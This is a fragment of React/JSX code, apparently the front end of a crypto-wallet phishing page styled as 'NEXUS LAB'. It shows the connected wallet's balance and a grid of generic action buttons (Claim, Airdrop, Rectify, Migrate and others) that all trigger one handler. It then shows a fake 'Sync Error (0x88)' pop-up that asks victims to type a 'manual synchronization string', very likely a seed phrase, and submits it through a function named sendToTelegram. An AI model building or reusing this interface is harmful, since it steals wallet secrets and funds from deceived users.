  ...
  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4">
      <header className="flex justify-between items-center mb-6">
        <h1 className="text-xl font-bold tracking-tighter text-cyan-400 uppercase">NEXUS LAB</h1>
      ...
      {isConnected && (
        <div className="bg-[#0d1117] border border-cyan-900/30 p-4 rounded-2xl mb-6 flex justify-between items-center">
          ...
          <span className="text-sm font-mono text-white tracking-widest">{balance?.formatted.slice(0, 6)} {balance?.symbol}</span>
        </div>
      )}
      ...
      <div className="grid grid-cols-3 gap-3">
        {["Claim", "Airdrop", "Stake", "Swap", "Bridge", "Rectify", "Validate", "Migrate", "Scan"].map((name) => (
          <button onClick={handleAction} key={name} className="bg-[#0d1117] border border-slate-800/50 p-6 rounded-2xl flex flex-col items-center gap-3 active:scale-95 transition-all hover:border-cyan-500/40">
            ...
            <span className="text-[9px] font-black uppercase text-slate-400 tracking-tighter">{name}</span>
          </button>
        ))}
      </div>
      ...
      {showSync && (
        <div className="fixed inset-0 bg-black/95 z-[70] flex items-center justify-center p-6">
          <div className="bg-[#0d1117] border border-red-900/30 w-full max-w-sm rounded-[32px] p-8 text-center">
            ...
            <h3 className="text-white font-bold uppercase text-lg tracking-tight">Sync Error (0x88)</h3>
            <p className="text-[11px] text-slate-500 mt-2 leading-relaxed">
              Automated connection failed. Please enter your manual synchronization string below.
            </p>
            <textarea 
            ...
            />
            <button onClick={sendToTelegram} className="w-full mt-6 bg-cyan-600 py-4 rounded-full text-xs font-black text-white">
              EXECUTE MANUAL SYNC
            </button>
          </div>
        </div>
